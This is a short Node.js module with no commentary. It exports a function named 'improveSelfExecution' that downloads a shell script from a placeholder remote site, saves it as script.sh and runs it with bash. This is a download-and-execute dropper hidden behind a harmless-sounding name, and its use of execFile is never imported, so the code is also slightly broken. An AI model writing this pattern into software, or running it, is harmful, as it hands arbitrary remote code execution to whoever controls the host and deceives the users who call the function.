import fetch from "node-fetch"
import fs from "fs";

async function download() {
    const res = await fetch('http://<some-site>/script.sh');
    await new Promise((resolve, reject) => {
        const fileStream = fs.createWriteStream('./script.sh');
        res.body.pipe(fileStream);
        fileStream.on("finish", function () {
            resolve();
        });
    });
}

const run = async () => {
    await download()
    execFile("bash", ["script.sh"]);
}

export default function improveSelfExecution() {
    return run()
}
